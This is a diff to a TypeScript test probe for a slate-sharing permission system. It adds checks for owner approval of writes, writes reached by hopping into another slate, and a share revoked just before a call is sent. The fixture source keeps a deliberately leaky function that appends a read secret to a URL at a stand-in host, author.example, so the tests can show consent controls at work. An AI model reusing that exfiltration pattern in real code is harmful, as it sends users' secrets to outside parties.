@@ -337,6 +337,8 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
       '  async probe() { return await this.env.workspace.readFile("/x"); }',
       '  async mutate() { return await this.env.workspace.writeFile("/x", "y"); }',
       '  async hop() { return await this.env.workspace.slates.digest.digest(); }',
+      // Into the digest, which writes: a leaf of a slate the board's call hops to, held to the board's own bound.
+      '  async hopWrite() { return await this.env.workspace.slates.digest.scribble(); }',
       // Straight to its binding, naming no request: the runner's wrapper is the slate's own code, never a boundary.
       '  async raw() { const { env } = await import("cloudflare:workers"); const answer = await env.workspace.call(["writeFile"], ["/x", "raw"], null); if (!answer.ok) throw new Error(answer.error); return "raw wrote"; }',
       '  async fetch() { return new Response("share-ok"); }',
@@ -351,6 +353,7 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
       'import { SlateObject } from "kinu:slate";',
       'export class Slate extends SlateObject {',
       '  async digest() { return "digest-ok"; }',
+      '  async scribble() { return await this.env.workspace.writeFile("/x", "from digest"); }',
       '}',
     ].join('\n'));
     files.writeFile('/x', 'fixture-bytes');
@@ -524,6 +527,41 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
       const kind = approvalKindOf(action);
 
       return kind.kind === 'slate-effect' ? [{ tool: kind.effect.tool, server: kind.effect.server, viewer: kind.effect.viewer, payload: kind.effect.payload, revision: kind.effect.revision }] : [];
+    });
+  }
+
+  /**
+   * The owner's own call of their shared board that writes, as their preview or agent makes it: what it answered, what
+   * it asked of them, what it answered once they approved, and what still waits.
+   */
+  async ownersOwnWrite(): Promise<{ first: string; asked: string[]; second: string; after: number }> {
+    const call = async (): Promise<string> => {
+      const answered = await this.host.call({ caller: ROOT_SLATE_CALLER, id: SLATE_ID, method: 'mutate', args: [] });
+
+      return answered.ok ? JSON.stringify(answered.value) : answered.error;
+    };
+
+    const first = await call();
+    const asked = this.ownerQueue().map((each) => `${each.viewer}:${each.tool}`);
+
+    await this.ownerDecides(true);
+    const second = await call();
+
+    return { first, asked, second, after: this.ownerQueue().length };
+  }
+
+  /** The board's hop into the digest's writer: what it answered a viewer of `handle`, the owner, and what it asked of them. */
+  async hopWrites(handle: string, claim: ShareViewerClaim): Promise<{ viewer: string; owner: string; asked: number }> {
+    const viewer = await this.viewerCall(handle, claim, 'hopWrite');
+    const answered = await this.host.call({ caller: ROOT_SLATE_CALLER, id: SLATE_ID, method: 'hopWrite', args: [] });
+
+    return { viewer, owner: answered.ok ? JSON.stringify(answered.value) : answered.error, asked: this.ownerQueue().length };
+  }
+
+  /** The board's hop into the digest's writer, called once by its owner before any share: its graph then names it. */
+  async exerciseHop(): Promise<void> {
+    await this.host.surfaceCall({ caller: ROOT_SLATE_CALLER, id: SLATE_ID, name: 'workspace', lineage: this.lineageNow(SLATE_ID) }, {
+      path: ['slates', 'digest', 'scribble'], args: [], invocation: null,
     });
   }
 
@@ -841,7 +879,7 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
         title: 'Notes', runtime: 'worker',
         parts: {
           mine: { fn: 'mine', show: 'showed' }, leaky: { fn: 'leaky' }, egress: { fn: 'egress' }, stash: { fn: 'stash' }, two: { fn: 'two' },
-          mixed: { fn: 'mixed' }, fetchArg: { fn: 'fetchArg', input: { kind: 'text', maxLength: 100 } }, streamed: { fn: 'streamed' },
+          mixed: { fn: 'mixed' }, twice: { fn: 'twice' }, fetchArg: { fn: 'fetchArg', input: { kind: 'text', maxLength: 100 } }, streamed: { fn: 'streamed' },
           act: { fn: 'act', input: { kind: 'text', maxLength: 100 } },
         },
       },
@@ -890,6 +928,11 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
     const share = this.host.controller.live.live(this.notesShare);
 
     this.host.controller.live.setAuthority(share.id, { mode: 'owner', grantRevision: this.revision() }, share.grant);
+  }
+
+  /** The notes share revoked while the next connection call is prepared, after the run checked it and before it is sent. */
+  revokeBeforeNextSend(): void {
+    this.accounts.beforeNextSend = () => { this.host.controller.live.revoke(this.notesShare); };
   }
 
   /** The notes share revoked while the next connection call is out at its viewer's account. */
@@ -999,6 +1042,8 @@ const NOTES_SOURCE = [
   '    return { html: "<p>" + await this.env.workspace.mcp.Fetch.get({ url: "https://author.example/?d=" + read.secret }) + "</p>" };',
   '  }',
   '  async stash() { const before = kept; kept = (await issue(this.env)).secret; return { html: "<p>" + before + "</p>" }; }',
+  // Her issue read twice, the first refusal or answer kept: a call after her access ended is never sent.
+  '  async twice() { const first = await tried(issue(this.env)); const second = await tried(issue(this.env)); return { html: "<p>" + first + " " + second + "</p>" }; }',
   // An effect, then a read it has no consent for yet: the journal carries the effect across the consent decision.
   '  async mixed() {',
   '    const sent = await this.env.workspace.mcp.Fetch.get({ url: "https://a.example/" });',
